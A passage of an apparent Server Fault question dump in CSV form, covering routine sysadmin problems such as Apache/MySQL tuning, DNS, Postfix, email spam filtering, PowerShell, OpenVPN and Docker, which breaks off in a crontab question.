"1014998","Maximum concurrent users on linux server","<p>I have a dedicated server with these info:</p>

<pre><code>128G RAM
6 cores/12 threads CPU, 3.4GHz
512 SSD storage
WHM/Cpanel latest
Apache/MySQL
Centos 7.x
</code></pre>

<p>I have a single website on this server which have heavy traffic at specific times of each day for less than one hour. At the peak traffic about 6000 users according to google analytics real time stats.</p>

<p>The average page load time by the server at about 500 users is about 0.15 seconds and the website code is very optimized for mysql.</p>

<p>The problem the server until 2000 concurrent users never have problem. After that number of users the Server load sometimes becomes 100% and above and mysql load becomes 600-900% and the website takes forever to load and displays server busy page and most of the time I have to restart mysql and apache servers.</p>

<p>These are my current settings in WHM for Apache:</p>

<pre><code>Start Servers = 5
Minimum Spare Servers = 5
Maximum Spare Servers =10
Server Limit (Maximum: 20,000) = 5000
Max Request Workers = 5000
Max Connections Per Child = 10000
Max Keep-Alive Requests = unlimited
Timeout = 300
</code></pre>

<p>These are my settings for mysql in my.cnf which is default by WHM:</p>

<pre><code># This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

#
# include all files from the config directory
#
!includedir /etc/my.cnf.d

[mysqld]
log-error=/var/lib/mysql/hosting.hostrose.com.err
performance-schema=0
default-storage-engine=MyISAM
innodb_file_per_table=1
innodb_buffer_pool_size=134217728
max_allowed_packet=268435456
open_files_limit=10000
max_connections=151
</code></pre>

<p>My question, what is the best values for these vars to serve that number of users without overloading or hanging the server specially for apache and mysql connections numbers.</p>
","<linux><centos><mysql><apache-2.4><whm>","2020-04-30 15:51:37"
"804988","Nameservers on ubuntu 14.04 server with VestaCP","<p>I have a pretty annoying nameserver problem on this ubuntu server of mine... I tried altering resolv.conf, i tried altering network/interfaces, i tried altering it trough the control panel, i just don't seem to get how to do it...</p>

<p>Do you guys know what could it be the answer if not those in those files?</p>

<p>I'm having problem even on troubleshooting this... I'm now totally lost.</p>

<p>additional info:</p>

<p>ping 8.8.8.8 - WORKS</p>

<p>ping ;myipadress; - WORKS</p>

<p>ping www.google.com - DON'T WORK</p>

<p>ping ;myDomainName; - WORKS (without the ""www."")
full content of /etc/resolv.conf</p>

<pre><code>search maisideiasdigital.com.br
nameserver 8.8.4.4
nameserver 8.8.8.8
</code></pre>

<p>important part of content of /etc/network/interfaces</p>

<pre><code>iface venet0:0 inet static
        address 93.188.165.192
        netmask 255.255.255.255
        dns-search google.com
        dns-nameservers 8.8.8.8 8.8.4.4
</code></pre>

<p>Result of curl www.google.com or dig www.google.com: not responding at all, just finishes at: could not resolve host: www.google.com</p>

<p>EDIT: I'm sorry, I'm a little bit newbie to those heavier server managements...</p>
","<ubuntu><domain-name-system><ubuntu-14.04><nameserver>","2016-09-23 17:34:31"
"1015064","Bootable one-to-one backup clone of Windows Server 2019?","<p>The ability to make backup clones of an OS link Linux and macOS (eg, <a href=""https://bombich.com/"" rel=""nofollow noreferrer"">Carbon Copy Cloner</a>, <a href=""https://shirt-pocket.com/SuperDuper/SuperDuperDescription.html"" rel=""nofollow noreferrer"">Super Duper</a>, <a href=""https://www.econtechnologies.com/chronosync/overview.html"" rel=""nofollow noreferrer"">ChronoSync</a>, etc.) offers wonderful peace of mind.</p>

<p>For years I've struggled with this seeming to not be available for Windows / Windows Server.  Recently I inquired of a few different companies as to whether they offered a product that could facilitate a one-to-one backup of Windows Server so that one could operate two solid state drives with one being a simple continually diff updated clone of the main operating drive such that if something happens to it one could simply boot to the backup drive.</p>

<p>Each company said ""No.""</p>

<p>Does such a tool exist? If not, what's stopping this from existing?</p>

<p>Options like Acronis True Image are too bulky since they require a boot drive + restore process. This kind of process is insanity for a server situation with time sensitive downtime issues, especially when RAID arrays may not be an option.</p>

<p>One final thought that crosses my mind, but seems sub-optimal: would running Windows Server 2019 on a bootable <a href=""https://www.easyuefi.com/wintousb/faq/en-US/What-is-Windows-To-Go.html"" rel=""nofollow noreferrer"">Windows To Go</a> with something like a <a href=""https://www.easyuefi.com/wintousb/faq/en-US/What-is-Windows-To-Go-Certified-Drives.html"" rel=""nofollow noreferrer"">USB SanDisk Extreme Pro USB 3.1</a> be a viable option where one would just copy it from time to time and run with such a speedy option? </p>
","<windows><backup><backup-restoration><windows-server-2019><windows-server-backup>","2020-04-30 20:49:01"
"805061","Server/storage choice for very low bandwidth video hosting","<p>I have a unique project where I'm needing host several terabytes of short ~15mb mp4 video files, of which each video will only be viewed <strong><em>once</em></strong>.</p>

<p>Is a CDN recommended here? Or would a basic storage solution like AWS S3, or DigitalOcean's Block Storage solution work well for me needs?</p>

<p>Thank you</p>
","<amazon-s3><cdn><video><video-hosting>","2016-09-24 01:52:46"
"805065","Getting ""Response is stale"" from Squid proxy","<p>I'm looking at the logs in Chrome dev tools. I can also see it using curl. Here is the output of curl</p>

<pre><code>Content-Type: application/javascript
Date: Sat, 24 Sep 2016 01:16:37 GMT
ETag: ""a02d00a09b8139b0919567e4c92cc752""
Last-Modified: Fri, 23 Sep 2016 22:57:56 GMT
Server: nginx
x-amz-id-2: L3gfIQNLcBLUZ2gtVWDiIdN9xWWiV2H6K6zjjE9JSHVMnDXI6+uLuhqptqQRCZLNFoMmWg3mIQs=
x-amz-request-id: E38062B3D506DF06
Content-Length: 1940494
Age: 7574
Warning: 110 squid/3.5.20 ""Response is stale""
X-Cache: HIT from 0.0.0.0
X-Cache-Lookup: HIT from 0.0.0.0:3128
Via: 1.1 0.0.0.0 (squid/3.5.20)
Connection: keep-alive
</code></pre>

<p>Why is Squid saying <code>Warning: 110 squid/3.5.20 ""Response is stale""</code>?</p>
","<nginx><squid>","2016-09-24 03:26:30"
"805132","Postfix failed because it can't set an exclusive lock","<p>I'm trying to make a Postfix-based E-mail server.
I face the following error whenever I try to launch the server:</p>

<pre><code>Sep 24 12:17:39 hostname9727 postfix/postfix-script[7506]: warning: group or other writable: /etc/postfix/./master.cf
Sep 24 12:17:39 hostname9727 postfix/postfix-script[7507]: warning: group or other writable: /etc/postfix/./relocated
Sep 24 12:17:39 hostname9727 postfix/postfix-script[7508]: warning: group or other writable: /etc/postfix/./generic
Sep 24 12:17:39 hostname9727 postfix/postfix-script[7524]: starting the Postfix mail system
Sep 24 12:17:39 hostname9727 postfix/master[7526]: fatal: open lock file /var/lib/postfix/master.lock: unable to set exclusive lock: Resource temp...vailable
Sep 24 12:17:40 hostname9727 postfix/master[7525]: fatal: daemon initialization failure
Sep 24 12:17:41 hostname9727 postfix/postfix-script[7527]: fatal: mail system startup failed
Sep 24 12:17:41 hostname9727 systemd[1]: postfix.service: control process exited, code=exited status=1
Sep 24 12:17:41 hostname9727 systemd[1]: Failed to start Postfix Mail Transport Agent.
Sep 24 12:17:41 hostname9727 systemd[1]: Unit postfix.service entered failed state.
Hint: Some lines were ellipsized, use -l to show in full.
</code></pre>

<p>postconf -M</p>

<pre><code>smtp       inet  n       -       n       -       -       smtpd
pickup     unix  n       -       n       60      1       pickup
cleanup    unix  n       -       n       -       0       cleanup
qmgr       unix  n       -       n       300     1       qmgr
tlsmgr     unix  -       -       n       1000?   1       tlsmgr
rewrite    unix  -       -       n       -       -       trivial-rewrite
bounce     unix  -       -       n       -       0       bounce
defer      unix  -       -       n       -       0       bounce
trace      unix  -       -       n       -       0       bounce
verify     unix  -       -       n       -       1       verify
flush      unix  n       -       n       1000?   0       flush
proxymap   unix  -       -       n       -       -       proxymap
proxywrite unix  -       -       n       -       1       proxymap
smtp       unix  -       -       n       -       -       smtp
relay      unix  -       -       n       -       -       smtp
showq      unix  n       -       n       -       -       showq
error      unix  -       -       n       -       -       error
retry      unix  -       -       n       -       -       error
discard    unix  -       -       n       -       -       discard
local      unix  -       n       n       -       -       local
virtual    unix  -       n       n       -       -       virtual
lmtp       unix  -       -       n       -       -       lmtp
anvil      unix  -       -       n       -       1       anvil
scache     unix  -       -       n       -       1       scache
</code></pre>

<p>postconf -n</p>

<pre><code>alias_database = hash:/etc/aliases home_mailbox = /home/virtual/mail/
alias_maps = hash:/etc/aliases
broken_sasl_auth_clients = yes
command_directory = /usr/sbin
config_directory = /etc/postfix
daemon_directory = /usr/libexec/postfix
data_directory = /var/lib/postfix
debug_peer_level = 2
debugger_command = PATH=/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin ddd $daemon_directory/$process_name $process_id &amp; sleep 5
home_mailbox = /home/virtual/mail/
html_directory = no
inet_interfaces = localhost
inet_protocols = all
mail_owner = postfix
mailq_path = /usr/bin/mailq.postfix
manpage_directory = /usr/share/man
mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain
mydomain = hostname9727.com
mynetworks = 127.0.0.0/8, 10.0.0.0/24
myorigin = $myhostname
newaliases_path = /usr/bin/newaliases.postfix
queue_directory = /var/spool/postfix
readme_directory = /usr/share/doc/postfix-2.10.1/README_FILES
sample_directory = /usr/share/doc/postfix-2.10.1/samples
sendmail_path = /usr/sbin/sendmail.postfix
setgid_group = postdrop
smtpd_banner = $myhostname ESMTP
unknown_local_recipient_reject_code = 550
</code></pre>

<p>what is the problem?
Thanks!</p>
","<centos><postfix><email-server>","2016-09-24 18:56:50"
"805197","Why my web host has DNS records while my domain is hosted separately and DNS records are there?","<p>I have my domain registered with <strong>name.com</strong> and the same is my domain host i.e. I use their name servers and all of my DNS records are there only an A record points to my web host while MX records point to Google Apps.</p>

<p>My web host is A2hosting that uses CPANEL. When I opened ""Advanced DNS Zone Editor"" in CPANEL, I could see default A and CNAME records for my domain. Now the questions are:</p>

<ol>
<li><p>Do those DNS records have any role while they would never be checked because I'm using nameservers of name.com?</p></li>
<li><p>Is it safe to delete all those records?</p></li>
<li><p>How A2hosting binds hosting with my A record?</p></li>
</ol>

<p>I would appreciate all answers. Thanks!</p>
","<domain-name-system><dns-hosting><dns-zone>","2016-09-25 13:40:48"
"805199","How to use a Apple XServe for NAS/Media storage/server?","<p>i have a Apple XServere RAID Array with one controller complete with 7 500GB HDD s. I am wondering how can I use this as a media typa server (maybe even run Plex?) / storage place for files with my imac and macbook. NAS Servers these days can just be plugged into a router via ethernet, so what would I need to get to be able to use this to store files etc.</p>

<p>thanks</p>
","<raid><storage><network-attached-storage><apple><xserve>","2016-09-25 13:58:29"
"1015364","How does reverse DNS add security?","<p>There are plenty of good answers here about how reverse DNS works, but why is it used?</p>

<p>It seems that all reverse DNS proves is that the person sending the email has access to the DNS records for the IP. For an end user on a residential connection I find outgoing mail getting blocked by the SMTP server because there is no reverse DNS record. Since I am not trying to spoof some other domain, but using the domain for the SMTP server, how does this check add any security? It seems like the first check should be if there is a large volume of mail coming from the IP before considering rejecting. </p>
","<email><smtp><reverse-dns>","2020-05-02 23:34:03"
"805300","Prevent email ending in spam-folders","<p>I have been using this <a href=""https://github.com/hardware/mailserver"" rel=""nofollow noreferrer"">dockerized mailserver</a> to set up a mailserver and webmail for my company. </p>

<p>I have followed all official instructions in order to avoid emails ending in spam-folders:</p>

<ul>
<li>SpamAssassin validates my emails</li>
<li>SPF (my server xx.xx.xx is authorized to use the mail-address)</li>
<li>DKIM signature is valid</li>
<li>Message parsed DMARC test</li>
<li>Reverse proxy is working</li>
</ul>

<p>Mails from my server scores a solid 10/10 on <a href=""http://www.mail-tester.com"" rel=""nofollow noreferrer"">mail-tester.com</a></p>

<p><strong>Problem:</strong> Emails send by my server ends up in spam-folders, tested on Yahoo and Hotmail (works on gmail).</p>

<p>My <a href=""http://mxtoolbox.com"" rel=""nofollow noreferrer"">mxtoolbox.com</a> test looks like this:</p>

<p><a href=""https://i.sstatic.net/ywXba.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/ywXba.png"" alt=""MX test""></a></p>

<p><strong>Question:</strong> What can I do to avoid ending up in spam-folders?</p>

<p><em>Please note:</em> Even though similar questions has been asked on serverfault, I have not found a solution to this problem. </p>
","<email><postfix><email-server><spam><dovecot>","2016-09-26 10:00:50"
"805310","Does the bash usleep block? Or will it yield to other threads?","<p>I understand there is a usleep command in bash. Is this a ""busy"" or ""blocking"" sleep? Or will this yield time to other processes?</p>
","<bash><block>","2016-09-26 10:36:55"
"805311","Powershell scripts to determine remote CPU Temperature","<p>Is there a Powershell Script to remotely check the CPU temperature of a Domain PC.
Thanks</p>
","<powershell-v4.0>","2016-09-26 10:39:11"
"805323","ssh connection refused all of a sudden","<p>I was logged into a remote server and it was working fine.
Suddenly my linux terminal stopped responding and I restarted it (while I was logged in)
Now when I try to ssh I get
ssh: connect to host my_ip my_port : Connection refused</p>

<p>I checked if ssh is running and it is.
It is listening on the same port too.</p>

<p>What can be the issue?</p>
","<linux><ssh>","2016-09-26 11:32:03"
"805341","Powershell: a simple script to take a list of commands and append the same cmdlet every time","<p>I have a list of commands I run in a script like this</p>

<pre><code>Some-Cmdlet -someswitch | Outfile -filepath .\somefile.txt -append
Another-Cmdlet -someswitch | Out-File -filepath .\somefile.txt -append
Hello-Cmdlet -someswitch | Out-File -filepath .\somefile.txt -append
Banana-Cmdlet -someswitch | Out-File -filepath .\somefile.txt -append
</code></pre>

<p>It is actually a long list of commands creating this <code>somefile.txt</code>.</p>

<p>If I have to change the location or name of <code>somefile.txt</code>, I have to edit every line one by one.  I'd like to clean up the script for maintainability, so what I'd like is something like this:</p>

<p>For the following list of commands:</p>

<pre><code>Some-Cmdlet -someswitch
Another-Cmdlet -someswitch
Hello-Cmdlet -someswitch
Banana-Cmdlet -someswitch
</code></pre>

<p>Always add this to the command:</p>

<pre><code> | Outfile -filepath .\somefile.txt -append
</code></pre>

<p>That way I only have to edit the script in one place if <code>somefile.txt</code> path or name needs to be changed.</p>
","<powershell><scripting><shell-scripting><powershell-v4.0>","2016-09-26 12:12:00"
"805466","ISP Refusing more IP addresses, want to run VM servers","<p>I have some great servers that are really underutilized and would love to setup about 20 VM servers but my ISP won't give me any more addresses. I currently have 5, and while they keep saying they will do it, nobody ever follows through and it has been about 6 months going back and forth. I need to find a simple way around the problem if possible.</p>

<p>I know about Nginx and HAProxy, though I have yet to implement it as it seemed more complicated that it should be. I don't want to forward just 1 or 2 ports, but ALL ports based off the incoming hostname request. When I or someone else is setting up a project, I don't want them to have to wonder if the problem is in the port forwarding or in the iptables of the server. </p>

<p>I have looked at this project on and off for months trying to use everything from an F5, PfSense and OpnSense. This doesn't seem like that strange of a request to me, with the prominence of virtual servers, it seems there has to be a simple solution at the firewall / gateway level to split the traffic up to a bunch of local ip addresses. In each case it seemed the solution was either poorly documented, or limited in scope to a single port at a time.</p>

<p>What am I missing here?</p>
","<ip><virtual-machines>","2016-09-26 20:56:52"
"1015660","how to count the open files without lsof","<p>we have in our cluster more then 800 rhel machines - version 7.2</p>

<p>since <code>lsof | wc -l</code> </p>

<p>take too much time ( sometimes 3-4 min ) , in order to get the current open files </p>

<p>we want to know if there are other approach that can give the total current open files in short time </p>

<p><em>note - in our case , we have 835 linux machines , so it will be very bad to use <code>lsof | wc -</code>l on all machines</em>  , according to our calculation it will take 40~hours </p>
","<linux><redhat><lsof><proc><file-descriptors>","2020-05-04 22:00:07"
"805645","How to set DNS to my IP and port - Atlantic.Net","<p><a href=""https://i.sstatic.net/a2Fuj.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/a2Fuj.png"" alt=""enter image description here""></a>I'm new to host my <code>ruby on rails</code> application on the server. I have bought a server from <strong>Atlantic.Net</strong> and running my project on a <code>port</code> let's say <code>port-3001</code>. Now I'm unable to set my domain to my <code>IP</code> and a specified <code>port</code>. Please suggest anyone what and how to do... ? </p>
","<domain-name-system><domain><internal-dns><dns-hosting><dns-zone>","2016-09-27 15:52:57"
"805690","not getting the response from the webserver for the request GET /","<p>When I <strong>telnet</strong> my server it is getting connected, however after telnet connection if I request for <strong>GET /</strong>, it is not giving any response. But, after telnet connection if I request for <strong>GET / HTTP/1.1</strong>, it is giving me response. May I know this is a firewall issue as Im not getting response for <strong>GET /</strong> but getting for <strong>GET / HTTP/1.1</strong></p>
","<networking><firewall><telnet>","2016-09-27 19:32:11"
"1015869","Installing SSL on Compute Engine","<p>I am trying to host a website on Google Cloud Platform. It was a little startling for me that no one has ever tried something this simple or even if they have tried they have not left any documentation for others to follow. Then I found some documentation on how to host a website on a LAMP stack configured on a <a href=""https://cloud.google.com/community/tutorials/joomla-on-compute-engine"" rel=""nofollow noreferrer"">Compute Engine Instance</a>. It was a bit difficult for me to follow but I managed to host a website, which is a Joomla! blog. I will be configuring a basic website too in the coming few days. Now I know the steps on how to configure a custom domain for the Instance however I wanted to know how can I host a website with Google managed SSL. There is some <a href=""https://cloud.google.com/sdk/gcloud/reference/compute/ssl-certificates/create"" rel=""nofollow noreferrer"">documentation</a> on that too however it is not detailed enough for someone like me to follow. Can someone please suggest good tutorials on the same? Maybe videos, blog posts, etc.?</p>

<p>Note: I am not talking about LetsEncrypt, I have seen the tutorials for doing that on a Bitnami LAMP Stack running WordPress. I wanted to know the steps for more secure, Google managed SSL for the Compute Engine Instance</p>
","<google-cloud-platform><google-compute-engine><google>","2020-05-06 04:54:36"
"1015884","how to recreate .ovpn file from existing openvpn","<p>I have "".ovpn"" file of my dev openvpn which is running in AWS but I want to make this file reconfigured as this file was shared with multiple teams. How can I recreate a new .ovpn file from my existing openvpn??</p>
","<openvpn>","2020-05-06 07:37:54"
"805935","Is it feasible to host a website from within a virtual machine? Where would I begin?","<p>I'm developing a website (written in PHP) whose backend will communicate with quite a few binary applications also installed on the machine. I want to host this website on a VPS that also hosts a few other websites. However, I feel like it'd be bad form to just install all the necessary binary applications on the main VPS where they could theoretically interact with any of the other website. So I feel like I should ""quarantine"" the entire website and its dependencies (Apache, MySQL, PHP and then the other programs that it depends on) in a virtual machine.</p>

<p>My first question is - would this run okay? That's a very general question, but my benchmark is essentially ""There is a negligible speed difference compared to just hosting it in the main VPS"".</p>

<p>And secondly, what kind of steps would I need to follow to achieve this? I know how to set up a virtual machine, and I can set up virtual hosts in Apache... but how would I make it so that when someone type mysite.com, Apache (on the host machine) looks at the virtual host configuration for mysite.com and goes ""Right, I need to serve up the contents from this virtual machine""?</p>
","<apache-2.2><virtualization><virtualhost><web-hosting>","2016-09-28 18:03:22"
"1015978","Monitor/view response codes of HTTPS traffic (e.g. port 443)?","<p>Is it possible to monitor/view the response codes of traffic to a server with HTTPS? I can use ngrep or tcpdump to view HTTP (port 80) but this won't work for HTTPS (port 443) requests - they simply don't show up.</p>

<p>For example, I'd like to test if web pages that googlebot is requesting are responding with 500 error codes, so that I can track down problems with googlebot not being able to access my pages.</p>

<p>I'm thinking maybe something like WireShark could do it, but I have no idea where to begin with a tool like that, and I'm not sure it can see the response codes since HTTPS is encrypted?</p>
","<linux><linux-networking>","2020-05-06 18:29:00"
"806043","Allow user accounts to be a local administrator on a specific computer","<p>Is there a way to give domain based accounts local admin access on specific machines and not others?</p>

<p>I can control access and rights to which machines a user can log in to and what their privileges are on a global scale but is there a way to control them on individual machines?</p>

<p>What we have now is an Active Directory group called Sec.LocalAdmin, we deployed this group 'Restricted Groups'. So every user that is a member of this group is local admin on every machine where this group is added to the Local Admin group. What we want is that every user is local admin on their own machine, is it possible to do this by a GPO?</p>
","<active-directory><group-policy>","2016-09-29 09:14:49"
"1016088","How to protect from coworkers","<p>Hello how to protect linux account form other administrators(coworkers) in company who can use your account to steal data and point a police that you are the guy who steal data from company.</p>

<p>if others coworkers have sudo they can change user by su command to your account then whipe logs they change account. 
how do you protect yourself?</p>
","<linux><sudo><su>","2020-05-07 11:26:07"
"1016232","Recursive chmod of all vhosts httpdocs directories on CentOS/Plesk","<p>A shared web hosting server running CentOS 7.8 with Plesk has the following directory structure for a few hundred vhosts:</p>

<pre><code>/var/www/vhosts/domain1.com/httpdocs/
/var/www/vhosts/domain2.com/httpdocs/
/var/www/vhosts/domain3.com/httpdocs/
</code></pre>

<p>httpdocs folder contains the web files in Plesk, like the standard public_html directory on Apache/cPanel. </p>

<p>I'm after a command or script to go through each vhosts domain directory and recursively chmod everything inside httpdocs - files to 644 and folders to 755 via SSH. There are other directories directly inside /domain1.com/, /domain2.com/ etc. so they shouldn't be touched, only the contents inside of httpdocs.</p>
","<linux><virtualhost><chmod><plesk>","2020-05-08 05:56:20"
"1016335","Why is the `+=` operator seemingly ignored in my PHP script?","<p>Sorry for asking in the wrong category. Would post directly in SO if I actually were able: <a href=""https://meta.stackexchange.com/questions/346772/i-dont-seem-to-be-able-to-register-a-stack-exchange-account"">https://meta.stackexchange.com/questions/346772/i-dont-seem-to-be-able-to-register-a-stack-exchange-account</a> Feel free to move this.</p>

<p><strong><em>Working code</em></strong></p>

<pre><code>$rows =
[
    [ 'a', '1' ],
    [ 'b', '2' ],
    [ 'c', '3' ]
];
var_dump($rows);
</code></pre>

<p><strong><em>Good output</em></strong></p>

<pre><code>array(3) {
  [0]=&gt;
  array(2) {
    [0]=&gt;
    string(1) ""a""
    [1]=&gt;
    string(1) ""1""
  }
  [1]=&gt;
  array(2) {
    [0]=&gt;
    string(1) ""b""
    [1]=&gt;
    string(1) ""2""
  }
  [2]=&gt;
  array(2) {
    [0]=&gt;
    string(1) ""c""
    [1]=&gt;
    string(1) ""3""
  }
}
</code></pre>

<p><strong><em>Non-working code</em></strong></p>

<pre><code>$rows = [];
$rows += [ 'a', '1' ];
$rows += [ 'b', '2' ];
$rows += [ 'c', '3' ];
var_dump($rows);
</code></pre>

<p><strong><em>Bad output</em></strong></p>

<pre><code>array(2) {
  [0]=&gt;
  string(1) ""a""
  [1]=&gt;
  string(1) ""1""
}
</code></pre>

<p>I also tried <code>$rows .= ...</code>, but it also doesn't work.</p>

<p>I cannot ""just use the first version"" because in the actual script, it's not all defined in the same place; it's generated in various loops and stuff in a large script. That's why I need to ""add to the rows array"" in the manner above, which I actually thought I had done in the past without problems. Apparently not?</p>
","<php>","2020-05-08 19:43:55"
"806333","windows 7 dhcp (as server) on interface","<p>I have a USB to ETH converter which I want to connect to a device that needs DHCP. How can I convince windows to act like a DHCP server for that interface?</p>

<p>Providing IP for device that I can later bind in windows browser.</p>

<p>Thanks in advance,</p>
","<windows><dhcp>","2016-09-30 12:24:38"
"806392","User Group membership script not working","<p>Any idea why below code is not working ? </p>

<p>Trying to export username then the groups on to a csv. I just need the group names only. </p>

<p>Please help - many thanks</p>

<pre><code>$users = (Get-Content users.txt)
foreach ($user in $users) {
$file = $user.Name + '_ACL'        
(Get-ADUser –Identity $user –Properties MemberOf).MemberOf -replace '^CN=([^,]+),OU=.+$','$1' | Export-CSV -path ""$file.csv"" -NoTypeInformation
}
</code></pre>
","<powershell><csv>","2016-09-30 16:15:30"
"806393","mysqld won't start on fedora 22","<p>I have a vm running a LAMP stack with Fedora 22. This is a server dedicated to running OwnCloud.</p>

<p>The server and OwnCLoud ran fine for several weeks. I had to reboot the server. On reboot mysqld fails to start. Attempting to manually start the service fails also.</p>

<pre><code>[root@cloudServ]/home/rcreasy# service mysqld start
Redirecting to /bin/systemctl start  mysqld.service
Job for mysqld.service failed because the control process exited with
error code. See ""systemctl status mysqld.service"" and ""journalctl -xe""
for details.
</code></pre>

<p>Here are the results of systemctl status mysqld.service</p>

<pre><code>[root@cloudServ]/home/rcreasy# systemctl status mysqld.service
● mysqld.service - MySQL Server
Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled)
Active: failed (Result: start-limit) since Fri 2016-09-30 12:03:34 EDT; 1min 3s ago
Process: 3851 ExecStart=/usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid $MYSQLD_OPTS (code=exited, status=1/FAILURE)
Process: 3829 ExecStartPre=/usr/bin/mysqld_pre_systemd (code=exited, status=0/SUCCESS)

Sep 30 12:03:34 cloudServ systemd[1]: mysqld.service: Unit entered failed state.
Sep 30 12:03:34 cloudServ systemd[1]: mysqld.service: Failed with result 'exit-code'.
Sep 30 12:03:34 cloudServ systemd[1]: mysqld.service: Service hold-off time over, scheduling ...art.
Sep 30 12:03:34 cloudServ systemd[1]: mysqld.service: Start request repeated too quickly.
Sep 30 12:03:34 cloudServ systemd[1]: Failed to start MySQL Server.
Sep 30 12:03:34 cloudServ systemd[1]: mysqld.service: Unit entered failed state.
Sep 30 12:03:34 cloudServ systemd[1]: mysqld.service: Failed with result 'start-limit'.
</code></pre>

<p>journalctl -xe gives many lines with (where XXX is several different numbers)</p>

<pre><code>Sep 30 12:15:12 cloudServ ownCloud[XXX]: {remote} Failed to connect to the database: An exception occured in driver: SQLSTATE[HY000] [2002] No such file or dir
</code></pre>

<p>Nothing new is written to /var/log/mysqld.log
Ownership on /var/lib/mysql and its contents is mysql:mysql</p>

<p>Can anyone point me in the right direction? </p>
","<mysql><fedora><owncloud>","2016-09-30 16:22:20"
"806401","Use COPY in Dockerfile to copy a file to the ROOT","<p>I am trying to write a simple Dockerfile, similar to hello-world.  </p>

<p>The image attached shows:</p>

<ol>
<li>The hello-world Dockerfile</li>
<li>My Dockerfile</li>
<li>The results of <code>docker build</code></li>
</ol>

<p>The syntax in my Dockerfile appears to be identical to the one from hello-world, yet no matter what combination of paths I use, I can't just COPY <code>hello.sh</code> to the root of the image.  I <strong>can</strong> copy it to a subfolder using different syntax.</p>

<p>Any ideas?</p>

<p><a href=""https://i.sstatic.net/cgW6p.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/cgW6p.png"" alt=""enter image description here""></a></p>
","<docker>","2016-09-30 17:11:35"
"806461","openvpn client behind sonicwall can't see WAN","<p>I have setup VPN client (on ubuntu) behind sonicwall but can't see any machine on the WAN when it is running.</p>

<p>When I am connect to the VPN I can't see the WAN router (and no domain names resolve). I can't ping the WAN router (from the LAN client) when I am ""connected"".</p>

<hr>

<p>ifconfig (not connected)</p>

<pre><code>enp5s0    Link encap:Ethernet  HWaddr 00:1c:23:e1:ec:ca
          inet addr:10.0.10.60  Bcast:10.0.10.255  Mask:255.255.255.0
          inet6 addr: eeee::21c:23ff:fee1:ecca/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:4917 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2834 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:6667701 (6.6 MB)  TX bytes:250136 (250.1 KB)
          Interrupt:16

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:164 errors:0 dropped:0 overruns:0 frame:0
          TX packets:164 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:12080 (12.0 KB)  TX bytes:12080 (12.0 KB)
</code></pre>

<hr>

<p>ifconfig (connected)</p>

<pre><code>enp5s0    Link encap:Ethernet  HWaddr 00:1c:23:e1:ec:ca
          inet addr:10.0.10.60  Bcast:10.0.10.255  Mask:255.255.255.0
          inet6 addr: eeee::21c:23ff:fee1:ecca/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5275 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3209 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:6703007 (6.7 MB)  TX bytes:345599 (345.5 KB)
          Interrupt:16

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:164 errors:0 dropped:0 overruns:0 frame:0
          TX packets:164 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:12080 (12.0 KB)  TX bytes:12080 (12.0 KB)

tun0      Link encap:UNSPEC  HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00
          inet addr:10.16.10.6  P-t-P:10.16.10.5  Mask:255.255.255.255
          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:100
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
</code></pre>

<p>I could be misunderstanding something... but I believe my network ip should be in the 10.0.10.xxx range, but when the vpn is ""connected"" (I use that term loosely), it is showing an ip of 10.16.10.6</p>

<p>This would be restricted by sonicwall and would explain why I can't see the WAN, how can I make it pick an ip in the range of my LAN?</p>

<p>I assume I need something setting in /etc/network/interfaces....</p>

<p>Current /etc/network/interfaces</p>

<pre><code>source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

# The primary network interface
auto enp5s0
iface enp5s0 inet dhcp
  address 10.0.10.60
  netmask 255.255.255.0
  gateway 10.0.10.10
</code></pre>

<p>Thanks</p>
","<ubuntu><openvpn><sonicwall>","2016-10-01 00:14:01"
"806472","Godaddy dedicated server randomly timeout users on just 400-500 Active users","<p>We have Godaddy's Dedicated server. but we are facing problems with this server. after on 400-500 active users server randomly timeout or kill users. we this it's error with IIS. We did conversation with some server experts they said there is some issue with IIS. but nobody can resolve this issue. i share a screen shoot of analytic of active users. Please help us.<a href=""https://i.sstatic.net/WlJgZ.png"" rel=""nofollow noreferrer"">analytic report</a>   </p>

<p><a href=""https://i.sstatic.net/BBYuD.png"" rel=""nofollow noreferrer"">Error Message</a></p>
","<windows><mysql>","2016-10-01 04:38:19"
"806488","Crontab not executing python script","<p>I have this <strong>root</strong> cronjob:</p>

<pre><code># Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
